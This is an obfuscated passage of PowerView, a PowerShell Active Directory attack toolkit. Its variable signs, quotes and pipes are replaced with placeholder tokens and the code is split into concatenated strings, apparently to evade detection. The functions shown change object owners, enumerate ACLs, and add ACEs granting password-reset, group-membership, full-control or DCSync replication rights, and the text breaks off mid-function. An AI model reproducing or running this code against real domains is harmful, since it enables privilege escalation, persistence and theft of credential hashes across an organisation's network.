        [Parameter(Mandatory = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aOwner41a)]
        [String]
        gIF1OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundPa'+'rameters[41aLDAPFil'+'ter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1OwnerSid = Get-DomainObject @SearcherArguments -Identity gIF1OwnerIdentity -Properties objectsid U9B Select-Object -ExpandProperty objectsid
        if (gIF1OwnerSid) {
            gIF1OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]gIF1OwnerSid
        }
        else {
            Write-Warning Zfr[Set-DomainObjectOwner] Error parsing owner identity 41agIF1OwnerIdentity41aZfr
        }
    }

    PROCESS {
        if (gIF1OwnerIdentityReference) {
            gIF1SearcherArguments[41aRaw41a] = gIF1True
            gIF1SearcherArguments[41aIdentity41a] = gIF1Identity

            # splat the appropriate arguments to Get-DomainObject
            gIF1RawObject = Get-DomainObject @SearcherArguments

            ForEach (gIF1Object in gIF1RawObject) {
                try {
                    Write-Verbose Zfr[Set-DomainObjectOwner] Attempting to set the owner for 41agIF1Identity41a to 41agIF1OwnerIdentity41aZfr
                    gIF1Entry = gIF1RawObject.GetDirectoryEntry()
                    gIF1Entry.PsBase.Options.SecurityMasks = 41aOwner41a
                    gIF1Entry.PsBase.ObjectSecurity.SetOwner(gIF1OwnerIdentityReference)
                    gIF1Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning Zfr[Set-DomainO'+'bjectOwner] Error setting owner: gIF1_Zfr
                }
            }
        }
    }
}


function Get-DomainObjectAcl {
<#
.SYNOPSIS

Returns the ACLs associated with a specific active directory object. By default
the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).'+'
Wildcards accepted.

.PARAMETER Sacl

Switch. Return the SACL instead of the DACL for the object (default behavior).

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER RightsFilter

A specific set of rights to return (41aAll41a, 41aResetPassword41a, 41aWriteMembers41a).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.'+'PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs

Get the ACLs for the matt.admin user in the testlab.local domain and
resolve relevant GUIDs to their display names.

.EXAMPLE

Get-DomainOU U9B Get-DomainObjectAcl -ResolveGUIDs

Enumerate the ACL permissions for all OUs in the domain.

.EXAMPLE

Get-DomainOU U9B Get-DomainObjectAcl -ResolveGUIDs -Sacl

Enumerate the SACLs for all OUs in the domain, resolving GUIDs.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainObjectAcl -Credential gIF1Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.ACL41a)]
    [Cmdl'+'etBinding()]
    Param (
'+'        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String[]]
        gIF1Identity,

        [Switch]
        gIF1Sacl,

        [Switch]
        gIF1ResolveGUIDs,

        [String]
        [Alias(41aRights41a)]
        [ValidateSet(41aAll41a, 41aResetPassword41a, 41aWriteMembers41a)]
        gIF1RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aProperties41a = 41asamaccountname,ntsecuritydescriptor,distinguishedname,objectsid41a
        }

        if (gIF1PSBoundParameters[41aSacl41a]) {
            gIF1SearcherArguments[41aSe'+'curityMasks41a] = 41aSacl41a
        }
        else {
            gIF1SearcherArguments[41aSecurityMasks41a] = 41aDacl41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1Searcher = Get-DomainSearcher @SearcherArguments

        gIF1DomainGUIDMapArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1DomainGUIDMapArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1DomainGUIDMapArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1DomainGUIDMapArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1DomainGUIDMapArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1DomainGUIDMapArguments[41aCredential41a] = gIF1Credential }

        # get a GUID -> name mapping
        if (gIF1PSBoundParameters[41aResolveGUIDs41a]) {
            gIF1GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (gIF1Searcher) {
            gIF1IdentityFilter = 41a41a
            gIF1Filter = 41a41a
            gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                if (gIF1IdentityInstance -match 41a^S-1-.*41a) {
                    gIF1IdentityFilter += Zfr(objectsid=gIF1IdentityInstance)Zfr
                }
                elseif (gIF1IdentityInstance -match 41a^(CNU9BOUU9BDC)=.*41a) {
                    gIF1IdentityFilter += Zfr(distinguishedname=gI'+'F1IdentityInstance)Zfr
                    if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                        # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        Write-Verbose Zfr[Get-DomainObjectAcl] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                        gIF1Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not gIF1Searcher) {
                            Write-Warning Zfr[Get-DomainObjectAcl] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                        }
                    }
                }
                elseif (gIF1IdentityInstance -imatch 41a^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}gIF141a) {
                    gIF1GuidByteString = (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object { 41aYwW41a + gIF1_.ToString(41aX241a) }) -join 41a41a
                    gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                }
                elseif (gIF1IdentityInstance.Contains(41a.41a)) {
                    gIF1IdentityFilter += Zfr(U9B(samAccountName=gIF1IdentityInstance)(name=gIF1IdentityInstance)(dnshostname=gIF1IdentityInstance))Zfr
                }
                else {
                    gIF1IdentityFilter += Zfr(U9B(samAccountName=gIF1IdentityInstance)(name=gIF1IdentityInstance)(displayname=gIF1IdentityInstance))Zfr
                }
            }
            if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
            }

            if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                Write-Verbose Zfr[Get-DomainObjectAcl] Using additional LDAP filter: gIF1LDAPFilterZfr
                gIF1Filter += ZfrgIF1LDAPFilterZfr
            }

            if (gIF1Filter) {
                gIF1Searcher.filter = Zfr(&gIF1Filter)Zfr
            }
            Write-Verbose Zfr[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: gIF1(gIF1Searcher.filter)Zfr

            gIF1Results = gIF1Searcher.FindAll()
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1Object = gIF1_.Properties

                if (gIF1Object.objectsid -and gIF1Object.objectsid[0]) {
                    gIF1ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier(gIF1Object.objectsid[0],0)).Value
                }
                else {
                    gIF1ObjectSid = gIF1Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList gIF1Object[41antsecuritydescriptor41a][0], 0 U9B ForEach-Object { if (gIF1PSBoundParameters[41aSacl41a]) {gIF1_.SystemAcl} else {gIF1_.DiscretionaryAcl} } U9B ForEach-Object {
                        if (gIF1PSBoundParameters[41aRightsFilter41a]) {
                            gIF1GuidFilter = Switch (gIF1RightsFilter) {
                                41aResetPassword41a { 41a00299570-246d-11d0-a768-00aa006e052941a }
                                41aWriteMembers41a { 41abf9679c0-0de6-11d0-a285-00aa003049e241a }
                                Default { 41a00000000-0000-0000-0000-00000000000041a }
                            }
                            if (g'+'IF1_.ObjectType -eq gIF1GuidFilter) {
                                gIF1_ U9B Add-Member NoteProperty 41aObjectDN41a gIF1Object.distinguishedname[0]
                                gIF1_ U9B Add-Member NoteProperty 41aObjectSID41a gIF1ObjectSid
                                gIF1Continue = gIF1True
      '+'                      }
                        }
                        else {
                            gIF1_ U9B Add-Member NoteProperty 41aObjectDN41a gIF1Object.distinguishedname[0]
                            gIF1_ U9B Add-Member NoteProperty 41aObjectSID41a gIF1ObjectSid
                            gIF1Continue = gIF1True
                        }

                        if (gIF1Continue) {
                            gIF1_ U9B Add-Member NoteProperty 41aActiveDirectoryRights41a ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], gIF1_.AccessMask))
                            if (gIF1GUIDs) {
                                # if we41are resolving GUIDs, map them them to the resolved hash table
                                gIF1AclProperties = @{}
                                gIF1_.psobject.properties U9B ForEach-Object {
                                    if (gIF1_.Name -match 41aObje'+'ctTypeU9BInheritedObjectTypeU9BObjectAceTypeU9BInheritedObjectAceType41a) {
                                        try {
                                            gIF1AclProperties[gIF1_.Name] = gIF1GUIDs[gIF1_.Value.toString()]
                                        }
                                        catch {
                                            gIF1AclProperties[gIF1_.Name] = gIF1_.Value
                                        }
                                    }
                                    else {
                                        gIF1AclProperties[gIF1_.Name] = gIF1_.Value
                                    }
                                }
                                gIF1OutObject = New-'+'Object -TypeName PSObject -Property gIF1AclProperties
                                gIF1OutObject.PSObject.TypeNames.Insert(0, 41aPowerView.ACL41a)
                                gIF1OutObject
                            }
                            else {
                                gIF1_.PSObject.TypeNames.Insert(0, 41aPowerView.ACL41a)
                                gIF1_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose Zfr[Get-DomainObjectAcl] Error: gIF1_Zfr
                }
            }
        }
    }
}


function Add-DomainObjectAcl {
<#
.SYNOPSIS

Adds an ACL for a specific active directory object.

AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
41aAll41a, 41aResetPassword41a, 41aWriteMembers41a, 41aDCSync41a, or a manual extended
rights GUID can be set with -RightsGUID. These rights are granted on the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies th'+'e domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server'+' spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 41aAll41a, 41aResetPassword41a, 41aWriteMembers41a, 41aDCSync41a.
Defaults to 41aAll41a.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

gIF1Harmj0ySid = Get-DomainUser harmj0y U9B Select-Object -ExpandProperty objectsid
Get-DomainObjectACL dfm.a -ResolveGUIDs U9B Where-Object {gIF1_.securityidentifier -eq gIF1Harmj0ySid}

...

Add-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(U9B(samAccountName=harmj0y)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:(&(U9B(samAccountName=dfm.a)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 41aResetPassword41a on CN=dfm (admin),CN=Users,DC=testlab'+',DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID 41a00299570-'+'246d-11d0-a768-00aa006e052941a on CN=dfm (admin),CN=Users,DC=testlab,DC=local

Get-DomainObjectACL dfm.a -ResolveGUIDs U9B Where-Object {gIF1_.securityidentifier -eq gIF1Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.EXAMPLE

gIF1Harmj0ySid = Get-DomainUser harmj0y U9B Select-Object -ExpandProperty objectsid
Get-DomainObjectACL testuser -ResolveGUIDs U9B Where-Object {gIF1_.securityidentifier -eq gIF1Harmj0ySid}

[no results returned]

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a-AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential gIF1Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 41aTESTLAB41a from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=lo'+'cal
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-Dom'+'ainObject] Get-DomainObject filter string: (&(U9B(U9B(samAccountName=harmj0y)(name=harmj0y))))
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 41aTESTLAB41a from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(U9B(U9B(samAccountName=testuser)(name=testuser))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 41aResetPassword41a on CN=testuser testuser,CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID 41a00299570-246d-11d0-a768-00aa006e052941a on CN=testuser,CN=Users,DC=testlab,DC=local

Get-DomainObjectACL testuser -ResolveGUIDs U9B Where-Object {gIF1_.securityidentifier -eq gIF1Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.LINK

https://adsecurity.org/?p=1906
https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String[]]
        gIF1TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1TargetSearchBase,

        [Parameter(Mandatory = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAt'+'tribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(41aAll41a, 41aResetPassword41a, 41aWriteMembers41a, 41aDCSync41a)]
        [String]
        gIF1Rights = 41aAll41a,

        [Guid]
        gIF1RightsGUID
    )

    BEGIN {
        gIF1TargetSearcherArguments = @{
            41aProperties41a = 41adistinguishedname41a
            41aRaw41a = gIF1True
        }
        if (gIF1PSBoundParameters[41aTargetDomain41a]) { gIF1TargetSearcherArguments[41aDomain41a] = gIF1TargetDomain }
        if (gIF1PSBoundParameters[41aTargetLDAPFilter41a]) { gIF1TargetSearcherArguments[41aLDAPFilter41a] = gIF1TargetLDAPFilter }
        if (gIF1PSBoundParameters[41aTargetSearchBase41a]) { gIF1TargetSearcherArguments[41aSearchBase41a] = gIF1TargetSearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1TargetSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1TargetSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1TargetSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1TargetSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1TargetSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCr'+'edential41a]) { gIF1TargetSearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1PrincipalSearcherArguments = @{
            41aIdentity41a = gIF1PrincipalIdentity
            41aProperties41a = 41adistinguishedname,objectsid41a
        }
        if (gIF1PSBoundParameters[41aPrincipalDomain41a]) { gIF1PrincipalSearcherArguments[41aDomain41a] = gIF1PrincipalDom'+'ain }
        if (gIF1PSBoundParameters[41aServer41a]) { g'+'IF1PrincipalSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchSco'+'pe41a]) { gIF1PrincipalSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1Pr'+'incipalSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1PrincipalSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1PrincipalSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1PrincipalSearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not gIF1Principals) {
            throw ZfrUnable to resolve principal: gIF1PrincipalIdentityZfr
        }
    }

    PROCESS {
        gIF1TargetSearcherArguments[41aIdentity41a] = gIF1TargetIdentity
        gIF1Targets = Get-DomainObject @TargetSearcherArguments

        ForEach (gIF1TargetObject in gIF1Targets) {

            gIF1InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 41aNone41a
            gIF1ControlType = [System.Security.AccessControl.AccessControlType] 41aAllow41a
            gIF1ACEs = @()

            if (gIF1RightsGUID) {
                gIF1GUIDs = @(gIF1RightsGUID)
            }
            else {
                gIF1GUIDs = Switch (gIF1Rights) {
                    # ResetPassword doesn41at need to know the user41as current password
                    41aResetPassword41a { 41a00299570-246d-11d0-a768-00aa006e052941a }
                    # allows for the modification of group membership
                    41aWriteMembers41a { 41abf9679c0-0de6-11d0-a285-00aa003049e241a }
                    # 41aDS-Replication-Get-Changes41a = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 41aDS-Replication-Get-Changes-All41a = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 41aDS-Replication-Get-Changes-In-Filtered-Set41a = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain41as ACL, allows for the use of DCSync
                    41aDCSync41a { 41a1131f6aa-9c07-11d1-f79f-00c04fc2dcd241a, 41a1131f6ad-9c07-11d1-f79f-00c04fc2dcd241a, 41a89e95b76-444d-4c62-991a-0facbeda640c41a}
                }
            }

            ForEach (gIF1PrincipalObject in gIF1Principals) {
                Write-Verbose Zfr[Add-DomainObjectAcl] Granting principal gIF1(gIF1PrincipalObject.distinguishedname) 41agIF1Rights41a on gIF1(gIF1TargetObject.Properties.distinguishedname)Zfr

                try {
                    gIF1Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]gIF1PrincipalObject.objectsid)

                    if (gIF1GUIDs) {
                        ForEach (gIF1GUID in gIF1GUIDs) {
                            gIF1NewGUID = New-Object Guid gIF1GUID
                            gIF1ADRights = [System.DirectoryServices.ActiveDirectoryRights] 41aExtendedRight41a
                            gIF1ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule gIF1Identity, gIF1ADRights, gIF1ControlType, gIF1NewGUID, gIF1InheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        gIF1ADRights = [System.DirectoryServices.ActiveDirectoryRights] 41aGenericAll41a
                        gIF1ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule gIF1Identity, gIF1ADRights, gIF1ControlType, gIF1InheritanceType
                    }

                    # add all the new ACEs to the specified object directory entry
                    ForEach (gIF1ACE in gIF1ACEs) {
                        Write-Verbose Zfr[Add-DomainObjectAcl] Granting principal gIF1(gIF1PrincipalObject.distinguishedname) rights GUID 41agIF1(gIF1ACE.ObjectType)41a on gIF1(gIF1TargetObject.Properties.distinguishedname)Zfr
                        gIF1TargetEntry = gIF1TargetObject.GetDirectoryEntry()
                        gIF1TargetEntry.PsBase.Options.SecurityMasks = 41aDacl41a
                        gIF1TargetEntry.PsBase.ObjectSecurity.AddAccessRule(gIF1ACE)
                        gIF1TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
